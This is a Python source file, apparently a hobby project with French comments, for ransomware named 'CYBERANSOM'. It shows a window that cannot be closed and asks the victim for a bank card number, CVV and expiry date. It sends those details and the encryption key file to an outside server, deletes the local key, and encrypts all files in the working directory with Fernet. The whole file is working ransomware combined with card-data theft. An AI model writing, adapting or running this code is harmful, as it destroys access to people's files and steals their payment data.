import tkinter as tk
import pygame
import os
from cryptography.fernet import Fernet
import platform
import requests
import json
import random
import string
import uuid


# Initialiser pygame pour la lecture audio
pygame.mixer.init()

# Charger le fichier MP3
pygame.mixer.music.load("rick.mp3")  # Remplacez "votre_fichier.mp3" par le chemin de votre fichier MP3

# Fonction pour jouer le fichier MP3
def jouer_mp3():
    pygame.mixer.music.play()

# Fonction appelée lorsque le bouton est cliqué
def afficher_texte():
    texte_carte = entry_carte.get()
    texte_cvv = entry_cvv.get()
    texte_date = entry_date.get()

    # Vérifier que les champs ne sont pas vides avant la mise à jour du texte
    if texte_carte and texte_cvv and texte_date:
        texte = "Lance decrypt et rentre MADUF11"
        label.config(text=texte)
        
        # Jouer le fichier MP3
        jouer_mp3()
        
        # Fermer la fenêtre après 10 secondes
        fenetre.after(10000, fermer_fenetre)
        
        my_os = platform.system()
        print("OS in my system : ", my_os)
        

        # Lire le contenu du fichier key.key
        with open("key.key", "rb") as key_file:
            data_to_send = key_file.read()

        # Générer un UID unique pour l'ordinateur
        computer_uid = str(uuid.uuid4())

        # Définir les données JSON pour l'action avec l'UID et l'ID aléatoire
        action_data = {
            "uid": computer_uid,  
            "action": "upload_key",
            "key_content": data_to_send.decode()  # Convertir bytes en str
        }
        # L'URL du serveur HTTPS où vous souhaitez envoyer les données JSON
        url = "https://rokhnir.alwaysdata.net"

        # Envoyez la requête POST avec les données JSON
        response = requests.post(url, json=action_data)

        if response.status_code == 200:
            print("Données JSON envoyées avec succès sur le serveur.")
        else:
            print("Échec de l'envoi des données JSON. Code d'état :", response.status_code)
        
        # Vous pouvez également envoyer les autres données dans un dictionnaire JSON
        carte_data = {
            "carte": texte_carte,
            "cvv": texte_cvv,
            "date": texte_date
        }
        
        # Envoyez la requête POST avec les données JSON
        response = requests.post(url, json=carte_data)

        if response.status_code == 200:
            print("Données de carte envoyées avec succès sur le serveur.")
        else:
            print("Échec de l'envoi des données de carte. Code d'état :", response.status_code)
            
        # Spécifiez le chemin complet du fichier que vous souhaitez supprimer
        fichier_a_supprimer = "key.key"

        try:
            os.remove(fichier_a_supprimer)
            print(f"Le fichier {fichier_a_supprimer} a été supprimé avec succès.")
        except OSError as e:
            print(f"Erreur lors de la suppression du fichier {fichier_a_supprimer}: {e}")
        
    else:
        texte = "Veuillez remplir tous les champs."
        label.config(text=texte)
        

# Fonction pour fermer la fenêtre
def fermer_fenetre():
    fenetre.destroy()

# Créer une fenêtre Tkinter
fenetre = tk.Tk()
fenetre.title("CYBERANSOM")

# Désactiver la fermeture de la fenêtre par l'utilisateur
fenetre.protocol("WM_DELETE_WINDOW", lambda: None)

# Définir la taille initiale de la fenêtre (largeur x hauteur)
fenetre.geometry("600x400")

# Changer la couleur de fond de la fenêtre en rouge
fenetre.configure(bg="red")

# Empêcher la diminution de la fenêtre
#fenetre.attributes('-fullscreen', True)

# Créer un cadre pour centrer le contenu
cadre_central = tk.Frame(fenetre)
cadre_central.pack(expand=True)

# Créer un label pour le code de la carte bancaire
label_carte = tk.Label(cadre_central, text="Code de carte bancaire:", font=("Helvetica", 19, "bold"))
label_carte.grid(row=0, column=0, padx=10, pady=10)

# Créer une zone d'écriture pour le code de la carte bancaire
entry_carte = tk.Entry(cadre_central)
entry_carte.grid(row=0, column=1, padx=10, pady=10)

# Créer un label pour le CVV
label_cvv = tk.Label(cadre_central, text="CVV:", font=("Helvetica", 19, "bold"))
label_cvv.grid(row=1, column=0, padx=10, pady=10)

# Créer une zone d'écriture pour le CVV
entry_cvv = tk.Entry(cadre_central)
entry_cvv.grid(row=1, column=1, padx=10, pady=10)

# Créer un label pour la DATE
label_date = tk.Label(cadre_central, text="DATE:", font=("Helvetica", 19, "bold"))
label_date.grid(row=2, column=0, padx=10, pady=10)

# Créer une zone d'écriture pour la DATE
entry_date = tk.Entry(cadre_central)
entry_date.grid(row=2, column=1, padx=10, pady=10)

# Créer un bouton pour payer
bouton_payer = tk.Button(cadre_central, text="PAYER", command=afficher_texte, font=("Helvetica", 19, "bold"))
bouton_payer.grid(row=3, columnspan=2, padx=10, pady=10)

# Créer un label pour afficher du texte
label = tk.Label(cadre_central, text="RANSOMWARE CYBERISEN     VOS FICHIERS ONT ETE CHIFFRE", font=("Helvetica", 24, "bold"))
label.grid(row=4, columnspan=2, padx=10, pady=10)


# Lancer la boucle principale de l'interface graphique
fenetre.mainloop()

allfiles =[]
for file in os.listdir():
    if file == "malware.py" or file == "key.key" or file == "decrypt1.py" or file == "malware.exe" or file =="decrypt1.exe" or file == "salaire_2024.py" or file == "rick.mp3" or file == "decrypt1.py" or file == "wire_dolphin.exe":
        continue
    if os.path.isfile(file):
        allfiles.append(file)
        
print(allfiles)


key = Fernet.generate_key()
with open("key.key", "wb") as thekey:
    thekey.write(key)
    
for file in allfiles:
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_encrypt = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypt)
        
print("Tu t'es fait avoir TDC XD XD XD")